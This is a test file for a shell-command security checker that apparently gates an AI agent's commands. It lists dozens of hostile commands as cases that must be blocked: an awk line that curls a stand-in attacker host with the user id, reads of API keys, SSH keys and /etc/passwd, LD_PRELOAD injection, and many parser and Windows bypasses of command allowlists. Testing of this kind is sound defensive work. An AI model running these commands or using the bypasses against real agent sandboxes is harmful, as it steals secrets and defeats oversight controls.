import fs from "node:fs";
import path from "node:path";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const TEST_ROOT = vi.hoisted(() => `/tmp/rowboat-command-executor-test-${process.pid}`);
const TEST_WORKDIR = vi.hoisted(() => `${TEST_ROOT}/workspace`);

vi.mock("../../config/config.js", () => ({
  WorkDir: TEST_WORKDIR,
}));

import { evaluateCommandSecurity, extractCommandNames, isBlocked } from "./command-executor.js";
import { resetSecurityAllowListCache, SECURITY_CONFIG_PATH } from "../../config/security.js";

function writeSecurityConfig(payload: unknown): void {
  fs.mkdirSync(path.dirname(SECURITY_CONFIG_PATH), { recursive: true });
  fs.writeFileSync(SECURITY_CONFIG_PATH, JSON.stringify(payload, null, 2), "utf8");
  resetSecurityAllowListCache();
}

beforeEach(() => {
  fs.rmSync(TEST_ROOT, { recursive: true, force: true });
  fs.mkdirSync(path.join(TEST_WORKDIR, "config"), { recursive: true });
  fs.mkdirSync(path.join(TEST_WORKDIR, "knowledge"), { recursive: true });
  fs.writeFileSync(path.join(TEST_WORKDIR, "knowledge", "note.md"), "hello world\n", "utf8");
  fs.writeFileSync(path.join(TEST_WORKDIR, "config", "oauth.json"), '{"token":"secret"}\n', "utf8");
  fs.writeFileSync(path.join(TEST_WORKDIR, "config", "slack.json"), '{"enabled":true}\n', "utf8");
  resetSecurityAllowListCache();
});

afterEach(() => {
  resetSecurityAllowListCache();
});

afterAll(() => {
  fs.rmSync(TEST_ROOT, { recursive: true, force: true });
});

describe("extractCommandNames", () => {
  it("does not treat ampersand redirections as command separators", () => {
    expect(extractCommandNames("echo ok 2>&1")).toEqual(["echo"]);
    expect(extractCommandNames("echo ok >&2")).toEqual(["echo"]);
    expect(extractCommandNames("cat <&0")).toEqual(["cat"]);
    expect(extractCommandNames("echo ok &>out.log")).toEqual(["echo"]);
    expect(extractCommandNames("echo ok &>>out.log")).toEqual(["echo"]);
    expect(extractCommandNames("echo ok 2>&1 | cat")).toEqual(["echo", "cat"]);
  });

  it("still splits background commands and command substitution", () => {
    expect(extractCommandNames("echo ok & rm -rf /tmp/nope")).toEqual(["echo", "rm"]);
    expect(extractCommandNames("echo $(rm -rf /tmp/nope)")).toEqual(["echo", "rm"]);
    expect(extractCommandNames('echo "$(rm -rf /tmp/nope)"')).toEqual(["echo", "rm"]);
    expect(extractCommandNames("echo `rm -rf /tmp/nope`")).toEqual(["echo", "rm"]);
    expect(extractCommandNames("(rm -rf /tmp/nope)")).toEqual(["rm"]);
  });

  it("splits process substitution commands", () => {
    expect(extractCommandNames("cat <(rm -rf /tmp/nope)")).toEqual(["cat", "rm"]);
    expect(extractCommandNames("diff <(echo left) >(sed s/left/right/)")).toEqual([
      "diff",
      "echo",
      "sed",
    ]);
  });

  it("rejects shell function definitions before command allow checks", () => {
    expect(extractCommandNames("echo () ( rm -rf /tmp/nope ); echo hi")).toEqual([
      "function-definition",
      "echo",
    ]);
    expect(extractCommandNames("deploy() { rm -rf /tmp/nope; }; deploy")).toContain(
      "function-definition",
    );
    expect(extractCommandNames("function deploy { rm -rf /tmp/nope; }; deploy")).toContain(
      "function-definition",
    );
  });

  it("does not treat quoted or word-local parentheses as command separators", () => {
    expect(extractCommandNames('echo "hello (world)"')).toEqual(["echo"]);
    expect(extractCommandNames("printf '%s (value)'")).toEqual(["printf"]);
    expect(extractCommandNames("printf '<(literal)'")).toEqual(["printf"]);
    expect(extractCommandNames("echo foo(bar)")).toEqual(["echo"]);
  });

  it("extracts wrapped commands past flags and env assignments", () => {
    expect(extractCommandNames("env -i FOO=bar sh -c id")).toEqual(["env", "sh"]);
    expect(extractCommandNames("sudo -u root rm -rf /tmp/nope")).toEqual(["sudo", "rm"]);
    expect(extractCommandNames("timeout -s KILL 5 bash -c id")).toEqual(["timeout", "bash"]);
    expect(extractCommandNames("xargs -n 1 sh")).toEqual(["xargs", "sh"]);
  });
});

describe("evaluateCommandSecurity / isBlocked", () => {
  it("blocks interpreter, env-dumper, and arbitrary-code PoCs even with a legacy security.json", () => {
    // Simulate a pre-upgrade install whose security.json still lists the old defaults
    writeSecurityConfig([
      "awk",
      "cat",
      "env",
      "find",
      "grep",
      "head",
      "jq",
      "printenv",
      "sort",
      "tail",
      "tree",
      "uniq",
      "yq",
    ]);

    const cases = [
      `awk 'BEGIN{system("curl -s https://attacker/$(id -u)")}'`,
      `awk 'BEGIN{system("id > AWK_RAN.txt")}'`,
      `/usr/bin/awk '{print $0}' knowledge/note.md`,
      `gawk 'BEGIN{system("id")}'`,
      `env`,
      `printenv`,
      `printenv OPENAI_API_KEY`,
      `env -i sh -c id`,
      `xargs sh -c id`,
      `find knowledge -exec sh -c id \\;`,
      `find knowledge -execdir id +`,
      `find knowledge -delete`,
      `find knowledge -fprint knowledge/out.txt`,
      `find / -name "*.key"`,
      `jq -n 'env'`,
      `jq -n '$ENV'`,
      `jq --rawfile x /etc/passwd -n .`,
      `yq -n 'env(SECRET)'`,
      `yq -i '.a=1' knowledge/note.md`,
      `sort -o config/security.json knowledge/note.md`,
      `sort -uo config/security.json knowledge/note.md`,
      `sort --compress-program=sh knowledge/note.md`,
      `uniq knowledge/note.md config/security.json`,
      `tree -o config/security.json knowledge/`,
    ];

    for (const cmd of cases) {
      const evaluation = evaluateCommandSecurity(cmd);
      expect(evaluation.blocked, `expected blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected no blanket grant: ${cmd}`).toBe(false);
    }
  });

  it("blocks file-reading commands targeting outside the workspace or protected config/", () => {
    const outsideFile = path.join(TEST_ROOT, "outside-secret.txt");
    fs.writeFileSync(outsideFile, "top-secret\n", "utf8");

    const symlinkToOutside = path.join(TEST_WORKDIR, "knowledge", "link-outside.txt");
    const symlinkToOauth = path.join(TEST_WORKDIR, "knowledge", "link-oauth.json");
    fs.symlinkSync(outsideFile, symlinkToOutside);
    fs.symlinkSync(path.join(TEST_WORKDIR, "config", "oauth.json"), symlinkToOauth);

    const cases = [
      "cat ~/.oppulence/config/oauth.json",
      "cat ~/.ssh/id_rsa",
      "cat ~root/.ssh/id_rsa",
      "cat /etc/passwd",
      `cat ${outsideFile}`,
      "cat ../outside-secret.txt",
      "cat config/oauth.json",
      "cat ./config/oauth.json",
      "cat knowledge/../config/oauth.json",
      "cat knowledge/link-outside.txt",
      "cat knowledge/link-oauth.json",
      "head -n 10 config/oauth.json",
      "tail config/models.json",
      "grep token config/oauth.json",
      "grep -efoo config/oauth.json",
      "grep -f config/oauth.json knowledge/note.md",
      "grep -if config/oauth.json knowledge/note.md",
      "grep -r token .",
      "grep -rn token",
      "ls config",
      "ls -R",
      "tree",
      "du",
      "cat *",
      "cat config/*",
      "cat knowledge/*/../../config/oauth.json",
      "cat < config/oauth.json",
      "cat < /etc/passwd",
    ];

    for (const cmd of cases) {
      const evaluation = evaluateCommandSecurity(cmd);
      expect(evaluation.blocked, `expected blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected allowScopeGrant=false: ${cmd}`).toBe(false);
    }
  });

  it("blocks dangerous shell syntax: redirections, expansions, command substitution, inline env, braces, cwd escape", () => {
    const cases = [
      `echo '["*"]' > config/security.json`,
      `echo pwn >> knowledge/note.md`,
      `echo ok &>out.log`,
      `echo ok >| /tmp/pwn`,
      `cat <> knowledge/note.md`,
      `echo $OPENAI_API_KEY`,
      `printf '%s' "$AWS_SECRET_ACCESS_KEY"`,
      `echo \${HOME}`,
      `echo $'\\'' ; id '`,
      `$(echo id)`,
      "`echo id`",
      `cat $(echo /etc/passwd)`,
      `cat <(echo hi)`,
      `PATH=knowledge ls`,
      `LD_PRELOAD=knowledge/evil.so ls`,
      `cat {config,knowledge}/oauth.json`,
      `printf -v X hi`,
      `echo "unterminated`,
      `cat <<< "hello"`,
    ];

    for (const cmd of cases) {
      const evaluation = evaluateCommandSecurity(cmd);
      expect(evaluation.blocked, `expected blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected allowScopeGrant=false: ${cmd}`).toBe(false);
    }

    expect(evaluateCommandSecurity("cat oauth.json", undefined, { cwd: "config" }).blocked).toBe(
      true,
    );
    expect(evaluateCommandSecurity("ls", undefined, { cwd: "/etc" }).blocked).toBe(true);
    expect(evaluateCommandSecurity("ls", undefined, { cwd: ".." }).blocked).toBe(true);
  });

  it("continues to allow safe read-only workspace commands without prompting", () => {
    const safeCases = [
      `echo "hello world"`,
      `echo '$100'`,
      `echo ok 2>&1`,
      `echo ok >&2`,
      `cat <&0`,
      `ls knowledge/ 2>/dev/null`,
      `cat knowledge/note.md`,
      `cat knowledge/note.md | grep "hello" | head -n 10`,
      `head -20 knowledge/note.md`,
      `cat < knowledge/note.md`,
      `grep -rn "hello" knowledge/`,
      `grep --color=never "hello" knowledge/note.md`,
      `grep -E "foo|bar" knowledge/note.md`,
      `grep -e "hello" knowledge/note.md`,
      `cat config/slack.json`,
      `ls`,
      `ls -la`,
      `ls knowledge/`,
      `ls knowledge/*.md`,
      `wc -l knowledge/note.md`,
      `diff -u knowledge/note.md knowledge/note.md`,
      `sort -u knowledge/note.md | uniq -c`,
      `pwd`,
      `date +%Y-%m-%d`,
      `whoami`,
      `uname -a`,
      `agent-slack message list "#general" --limit 25`,
    ];

    for (const cmd of safeCases) {
      const evaluation = evaluateCommandSecurity(cmd);
      expect(
        evaluation.blocked,
        `expected allowed: ${cmd} (reasons=${evaluation.capabilityReasons.join("; ")}, blocked=${evaluation.blockedCommands.join(",")})`,
      ).toBe(false);
    }
  });

  it("blocks Round 1 parser-differential, zsh/fish, GNU-abbreviation, optional-flag, and LOLBin bypasses", () => {
    const symlinkToOauth = path.join(TEST_WORKDIR, "knowledge", "link-oauth.json");
    fs.symlinkSync(path.join(TEST_WORKDIR, "config", "oauth.json"), symlinkToOauth);

    const posixBypassCases = [
      // S1-1: shell comment quote desync
      "echo # '\nid\n# '",
      "echo ok # trailing comment",
      // S1-2: redirection target expansion / continuation / empty command READNULLCMD
      "cat < ${X}/etc/passwd",
      "cat < conf\\\nig/oauth.json",
      "echo < $OPENAI_API_KEY",
      "< /etc/passwd",
      "< knowledge/note.md",
      // S1-3 / S1-6 / 7.2: zsh glob qualifiers, =(), fish (), non-brace functions
      "echo knowledge/*(e:'id':)",
      "echo =(id)",
      "echo (id)",
      "echo() repeat 1 id; echo",
      // S1-5: &>/dev/null differential against /bin/sh (dash)
      "echo hi &>/dev/null id >&2",
      "echo hi &>/dev/null",
      // S1-8: glob in directory containing symlink to protected config
      "cat knowledge/*",
      // S2-1 / S2-2 / S2-4 / S2-5: GNU abbreviations & optional-arg skips & unsafe flags
      "sort --comp=sh knowledge/note.md",
      "sort --out=config/security.json knowledge/note.md",
      "wc --files0=knowledge/note.md",
      "date --fi=/etc/passwd",
      "date -r/etc/passwd",
      "grep --reg=. /etc/passwd",
      "grep --rec '' .",
      "grep '' --color config/oauth.json",
      "grep -drecurse '' .",
      "grep --directories recurse '' .",
      "diff --unified /etc/passwd /dev/null",
      "diff --from-file=/etc/passwd knowledge/note.md",
      "diff -ruN knowledge .",
      "ls --color config",
      "stat -f /etc/passwd",
      "file -C",
      "df --output /etc",
      // S2-3 / 7.5: agent-slack write / privileged subcommands
      'agent-slack message send "#general" "pwn"',
      "agent-slack message delete C123 1234.5678",
      "agent-slack channel invite C123 U123",
      "agent-slack auth status",
      // S2-6 / S2-7 / 7.6: versioned & .exe interpreters and LOLBins
      "python3.12 -c 'import os; os.system(\"id\")'",
      "cmd.exe /c whoami",
      "powershell.exe -Command id",
      "open /etc/passwd",
      "security find-generic-password -w",
      "pbpaste",
      "npx cowsay hi",
      // S2-8: git dangerous flags & subcommands even if allowlisted
      "git --git-dir=/tmp/.git status",
      "git -C /etc status",
      "git diff --no-index /etc/passwd /dev/null",
      "git config --global core.editor sh",
      "git difftool",
      "git bisect start",
    ];

    for (const cmd of posixBypassCases) {
      const evaluation = evaluateCommandSecurity(cmd, new Set(["git"]), {
        shellDialect: "posix-sh",
        platform: "linux",
      });
      expect(evaluation.blocked, `expected blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected allowScopeGrant=false: ${cmd}`).toBe(false);
    }

    // S1-7: nested wrapper extraction
    expect(extractCommandNames("sudo env -S 'sh -c id'", "posix-sh")).toEqual(
      expect.arrayContaining(["sudo", "env", "sh"]),
    );
    expect(extractCommandNames("nohup nice /usr/bin/env bash -c id", "posix-sh")).toEqual(
      expect.arrayContaining(["nohup", "nice", "/usr/bin/env", "bash"]),
    );

    // S1-4 / 7.1: Windows cmd.exe dialect bypasses
    const cmdExeCases = [
      "echo ' & whoami '",
      "echo x \\& whoami",
      'echo "a\\" & whoami"',
      "echo %OPENAI_API_KEY%",
      "echo !SECRET!",
      "echo a ^& whoami",
      "cat config\\oauth.json",
    ];
    for (const cmd of cmdExeCases) {
      const evaluation = evaluateCommandSecurity(cmd, undefined, {
        shellDialect: "windows-cmd",
        platform: "win32",
      });
      expect(evaluation.blocked, `expected windows-cmd blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected windows-cmd no scope grant: ${cmd}`).toBe(false);
    }

    // S3-3 / 7.4: macOS case-insensitive protected config path
    const darwinCaseBypass = evaluateCommandSecurity("cat Config/oauth.json", undefined, {
      shellDialect: "posix-sh",
      platform: "darwin",
    });
    expect(darwinCaseBypass.blocked).toBe(true);
    expect(darwinCaseBypass.allowScopeGrant).toBe(false);
  });

  it("allows session/always scope grants for ordinary unallowlisted commands but not dangerous flags", () => {
    fs.mkdirSync(path.join(TEST_WORKDIR, "knowledge", ".git"), { recursive: true });
    const safeGit = evaluateCommandSecurity("git status", undefined, { cwd: "knowledge" });
    expect(safeGit.blocked).toBe(true);
    expect(safeGit.allowScopeGrant).toBe(true);

    const dangerousGit = evaluateCommandSecurity("git -c core.sshCommand=sh status", undefined, {
      cwd: "knowledge",
    });
    expect(dangerousGit.blocked).toBe(true);
    expect(dangerousGit.allowScopeGrant).toBe(false);

    expect(isBlocked("git status", new Set(["git"]), { cwd: "knowledge" })).toBe(false);
    // Without a workspace .git directory, git must require approval (prevents walking up to $HOME/.git)
    expect(isBlocked("git status", new Set(["git"]))).toBe(true);
    expect(isBlocked("awk 'BEGIN{system(\"id\")}'", new Set(["awk"]))).toBe(true);
  });

  it("blocks Round 2 parser differentials, precommand modifiers, LOTL flags, recursive symlink/.git scans, git/slack bypasses, and Windows cmd tricks", () => {
    const symlinkToOauth = path.join(TEST_WORKDIR, "knowledge", "link-oauth.json");
    fs.symlinkSync(path.join(TEST_WORKDIR, "config", "oauth.json"), symlinkToOauth);
    const gitDir = path.join(TEST_WORKDIR, "knowledge", ".git");
    fs.mkdirSync(gitDir, { recursive: true });
    fs.writeFileSync(
      path.join(gitDir, "config"),
      '[remote "origin"]\nurl=https://tok@example.com\n',
    );

    const posixRound2Cases = [
      // R2-S1-1: POSIX double-quote backslash differential
      'uniq "\\-f" config/security.json',
      'head -n 99999 "\\-n" config/oauth.json',
      'grep -F -v "\\-e" config/oauth.json',
      // R2-S1-2: shell precommand modifiers, control-flow keywords, and OS wrappers/mutators
      "! python3 -c 'import os; os.system(\"id\")'",
      "noglob bash -c id",
      "if true; then id; fi",
      "arch -arm64 sh -c id",
      "strace id",
      "docker run alpine id",
      "rm -rf knowledge/note.md",
      "cp config/oauth.json knowledge/leak.txt",
      "less config/oauth.json",
      // R2-S2-1: file -m / -f exfiltration
      "file -m knowledge/note.md:config/oauth.json /dev/null",
      "file -f knowledge/note.md",
      "file --magic-file=config/oauth.json /dev/null",
      // R2-S2-2: BSD/GNU ls -T / -w ambiguity
      "ls -la -w config",
      "ls -la -T config",
      // R2-S2-3 / R2-S7-4: symlink-following flags & recursive scans over .git / unsafe symlinks
      "grep -R token knowledge/",
      "grep --dereference-recursive token knowledge/",
      "grep -r token knowledge/",
      "ls -R knowledge/",
      "ls -L knowledge/link-oauth.json",
      "du -L knowledge/",
      "tree -l knowledge/",
      "rg --follow token knowledge/",
      "rg -L token knowledge/",
      // R2-S2-4: agent-slack global flag spoofing
      "agent-slack -v message send '#general' pwn",
      "agent-slack --unknown-flag message list '#general'",
      "agent-slack message list '#general' --evil-flag",
      // R2-S2-5: git global flags, output/pager overrides, and mutating subcommands
      "git --namespace status difftool -y -x id",
      "git log --output=config/security.json",
      "git log -oconfig/security.json",
      "git grep -O 'sh -c id' foo",
      "git add .",
      "git restore knowledge/note.md",
      "git stash drop",
      "git branch -D main",
      // R2-S2-6: rg --files positional path & generic file-reader unknown flags
      "rg --files /etc",
      "nl -s/etc/passwd knowledge/note.md",
    ];

    for (const cmd of posixRound2Cases) {
      const evaluation = evaluateCommandSecurity(cmd, new Set(["git", "rg", "nl"]), {
        shellDialect: "posix-sh",
        platform: "linux",
      });
      expect(evaluation.blocked, `expected blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected allowScopeGrant=false: ${cmd}`).toBe(false);
    }

    // R2-S1-3 / R2-S7-2 / R2-S7-3: Windows cmd.exe delimiters, quoted metachars, quoted globs, @/call
    const windowsRound2Cases = [
      "type knowledge\\note.md,config\\oauth.json",
      "type knowledge\\note.md;config\\oauth.json",
      "type knowledge\\note.md=config\\oauth.json",
      'agent-slack message list "#general" "foo & calc.exe"',
      'cat "*\\oauth.json"',
      "@cmd /c calc",
      "call cmd /c calc",
      "if exist knowledge\\note.md cmd /c calc",
    ];
    for (const cmd of windowsRound2Cases) {
      const evaluation = evaluateCommandSecurity(cmd, new Set(["type"]), {
        shellDialect: "windows-cmd",
        platform: "win32",
      });
      expect(evaluation.blocked, `expected windows-cmd blocked: ${cmd}`).toBe(true);
      expect(evaluation.allowScopeGrant, `expected windows-cmd allowScopeGrant=false: ${cmd}`).toBe(
        false,
      );
    }
  });

  it("blocks Round 3 command-parser, flag, git, Windows, and symlink-to-WorkDir bypasses while preserving knowledge/.git workflows", () => {
    const workDir = TEST_WORKDIR;

    // Seat 1: primary command globs and path-qualified commands
    for (const cmd of ["/*bin/sh -c id", "/bin/c?t knowledge/note.md", "c[a]t knowledge/note.md"]) {
      const ev = evaluateCommandSecurity(cmd);
      expect(ev.blocked, `expected glob command blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant, `expected glob command allowScopeGrant=false: ${cmd}`).toBe(false);
    }
    const pathQualified = evaluateCommandSecurity("/usr/local/bin/customtool");
    expect(pathQualified.blocked).toBe(true);
    expect(pathQualified.allowScopeGrant).toBe(false);

    // Seat 1 / S7-2: Windows trailing dots, NTFS ADS, control chars, drive-relative, DOS devices, and / flags
    const winCases = [
      "cmd.exe. /c whoami",
      "powershell.exe.. -Command id",
      "awk.exe::$DATA 'BEGIN{system(\"id\")}'",
      "cat.exe::$DATA knowledge\\note.md",
      "cat\x0bknowledge\\note.md",
      "cat\x0cknowledge\\note.md",
      "cat C:secret.txt",
      "cat knowledge\\note.md:stream",
      "cat CON",
      "cat NUL.txt",
      "ls /s",
    ];
    for (const cmd of winCases) {
      const ev = evaluateCommandSecurity(cmd, new Set(["cat", "ls"]), {
        shellDialect: "windows-cmd",
        platform: "win32",
      });
      expect(ev.blocked, `expected win32 R3 case blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant, `expected win32 R3 case allowScopeGrant=false: ${cmd}`).toBe(
        false,
      );
    }

    // Seat 2 Critical: recursive commands with flag-file values MUST still trigger implicit-CWD guard
    for (const cmd of [
      "grep -r -f /dev/null",
      "grep -r --exclude-from=/dev/null secret",
      "du -X /dev/null",
      "rg --color never secret",
      "rg --ignore-file=/dev/null secret",
    ]) {
      const ev = evaluateCommandSecurity(cmd, new Set(["rg"]));
      expect(ev.blocked, `expected implicit-CWD recursive command blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant, `expected allowScopeGrant=false: ${cmd}`).toBe(false);
    }

    // Seat 2 / S7-1: git strict allowlist blocks abbreviations, --contents, and implicit --no-index
    for (const cmd of [
      "git diff config/oauth.json /dev/null",
      "git diff /etc/passwd /dev/null",
      "git diff --no-ind knowledge/note.md /dev/null",
      "git diff --ext-d",
      "git log --out=/tmp/pwn.txt",
      "git blame --contents /etc/passwd knowledge/note.md",
      "git blame --contents=config/oauth.json knowledge/note.md",
      "git ls-files -X /etc/passwd",
      "git show HEAD:config/oauth.json",
    ]) {
      const ev = evaluateCommandSecurity(cmd, new Set(["git"]));
      expect(ev.blocked, `expected git bypass blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant, `expected git allowScopeGrant=false: ${cmd}`).toBe(false);
    }

    // Legitimate git read-only commands inside a workspace git repo (`knowledge/.git`) remain allowed
    fs.mkdirSync(path.join(workDir, "knowledge", ".git"), { recursive: true });
    expect(
      evaluateCommandSecurity("git status --short", new Set(["git"]), { cwd: "knowledge" }).blocked,
    ).toBe(false);
    expect(
      evaluateCommandSecurity("git log --oneline -n 5", new Set(["git"]), { cwd: "knowledge" })
        .blocked,
    ).toBe(false);
    expect(
      evaluateCommandSecurity("git diff --stat", new Set(["git"]), { cwd: "knowledge" }).blocked,
    ).toBe(false);

    // S9-1 regression fix: shallow non-dot globs & default tree/rg work alongside knowledge/.git,
    // while dot-traversing recursive commands (`grep -r`, `tree -a`, `rg --hidden`, `cat knowledge/.git*`) remain blocked
    expect(evaluateCommandSecurity("cat knowledge/*.md").blocked).toBe(false);
    expect(evaluateCommandSecurity("ls knowledge/*.md").blocked).toBe(false);
    expect(evaluateCommandSecurity("tree knowledge").blocked).toBe(false);
    expect(evaluateCommandSecurity("rg hello knowledge", new Set(["rg"])).blocked).toBe(false);

    expect(evaluateCommandSecurity("grep -r hello knowledge").blocked).toBe(true);
    expect(evaluateCommandSecurity("tree -a knowledge").blocked).toBe(true);
    expect(evaluateCommandSecurity("rg --hidden hello knowledge", new Set(["rg"])).blocked).toBe(
      true,
    );
    expect(evaluateCommandSecurity("cat knowledge/.git*").blocked).toBe(true);

    // Seat 2 Medium: symlink inside subdirectory pointing to WorkDir root is rejected
    fs.mkdirSync(path.join(workDir, "notes-clean"), { recursive: true });
    fs.writeFileSync(path.join(workDir, "notes-clean", "ok.md"), "ok\n", "utf8");
    fs.symlinkSync(workDir, path.join(workDir, "notes-clean", "to-root"));
    expect(evaluateCommandSecurity("cat notes-clean/*").blocked).toBe(true);
    expect(evaluateCommandSecurity("grep -r secret notes-clean").blocked).toBe(true);
  });

  it("blocks Round 4 Windows CWD shadow, '[' glob, BSD getopt permutation, optional git flags, git pathspec magic, and Windows tree .git bypasses", async () => {
    const workDir = TEST_WORKDIR;
    fs.mkdirSync(path.join(workDir, "knowledge", ".git"), { recursive: true });

    // S1-1 Critical: Windows cmd.exe CWD executable shadowing (`ls.cmd` / `cat.bat`)
    fs.writeFileSync(path.join(workDir, "ls.cmd"), "@echo pwned\r\n", "utf8");
    const shadowedWin = evaluateCommandSecurity("ls knowledge", new Set(["ls"]), {
      shellDialect: "windows-cmd",
      platform: "win32",
    });
    expect(shadowedWin.blocked).toBe(true);
    expect(shadowedWin.allowScopeGrant).toBe(false);
    fs.rmSync(path.join(workDir, "ls.cmd"));

    // S1-2 High: Windows '[' character-class glob bypass (`cat [c]onfig/oauth.json`)
    const winBracketGlob = evaluateCommandSecurity("cat [c]onfig/oauth.json", new Set(["cat"]), {
      shellDialect: "windows-cmd",
      platform: "win32",
    });
    expect(winBracketGlob.blocked).toBe(true);
    expect(winBracketGlob.allowScopeGrant).toBe(false);

    // S1-3 / S7-5: getExecutionShell('win32') pins ComSpec strictly inside SystemRoot
    const { getExecutionShell } = await import("../assistant/runtime-context.js");
    const origComSpec = process.env.ComSpec;
    const origSystemRoot = process.env.SystemRoot;
    try {
      process.env.SystemRoot = "C:\\Windows";
      process.env.ComSpec = "C:\\Users\\evil\\cmd.exe";
      expect(getExecutionShell("win32")).toBe("C:\\Windows\\System32\\cmd.exe");
      process.env.ComSpec = "C:\\Windows\\System32\\cmd.exe";
      expect(getExecutionShell("win32")).toBe("C:\\Windows\\System32\\cmd.exe");
    } finally {
      if (origComSpec === undefined) delete process.env.ComSpec;
      else process.env.ComSpec = origComSpec;
      if (origSystemRoot === undefined) delete process.env.SystemRoot;
      else process.env.SystemRoot = origSystemRoot;
    }

    // S2-1 Critical: BSD vs GNU getopt permutation differential (flag after positional)
    for (const cmd of [
      "head knowledge/note.md -n config/oauth.json",
      "tail knowledge/note.md -n config/oauth.json",
      "uniq knowledge/note.md -c",
      "grep hello knowledge/note.md -m config/oauth.json",
    ]) {
      const ev = evaluateCommandSecurity(cmd);
      expect(ev.blocked, `expected BSD/GNU permutation blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant).toBe(false);
    }

    // S2-2 Critical: optional-arg git flags must NEVER skip the next token
    for (const cmd of [
      "git log --pretty --output=config/security.json",
      "git show --pretty --output=/tmp/out",
      "git show --format --ext-diff",
      "git diff -U --output=config/security.json",
      "git diff --unified --ext-diff",
      "git status -u ../config/",
      "git describe --abbrev --broken",
    ]) {
      const ev = evaluateCommandSecurity(cmd, new Set(["git"]), { cwd: "knowledge" });
      expect(ev.blocked, `expected optional-arg git bypass blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant).toBe(false);
    }

    // Legitimate attached/optional git flags inside workspace git repo still work
    expect(
      evaluateCommandSecurity("git status -u", new Set(["git"]), { cwd: "knowledge" }).blocked,
    ).toBe(false);
    expect(
      evaluateCommandSecurity("git status -uno", new Set(["git"]), { cwd: "knowledge" }).blocked,
    ).toBe(false);
    expect(
      evaluateCommandSecurity("git diff -U3", new Set(["git"]), { cwd: "knowledge" }).blocked,
    ).toBe(false);
    expect(
      evaluateCommandSecurity("git log --pretty=oneline -n 5", new Set(["git"]), {
        cwd: "knowledge",
      }).blocked,
    ).toBe(false);

    // S2-3 Medium: git pathspec magic (`:(top)...`), index stage (`:0:...`), and symlink .git blocked
    for (const cmd of [
      "git diff :(top)config/oauth.json",
      "git show :0:config/oauth.json",
      "git log -- :0:config/oauth.json",
    ]) {
      const ev = evaluateCommandSecurity(cmd, new Set(["git"]), { cwd: "knowledge" });
      expect(ev.blocked, `expected git pathspec magic blocked: ${cmd}`).toBe(true);
      expect(ev.allowScopeGrant).toBe(false);
    }

    // S2-4 Medium: Windows `tree knowledge` does NOT hide dot-dirs so `knowledge/.git` is blocked on Windows
    const winTreeGit = evaluateCommandSecurity("tree knowledge", new Set(["tree"]), {
      shellDialect: "windows-cmd",
      platform: "win32",
    });
    expect(winTreeGit.blocked).toBe(true);
    expect(evaluateCommandSecurity("tree knowledge").blocked).toBe(false);
  });
});
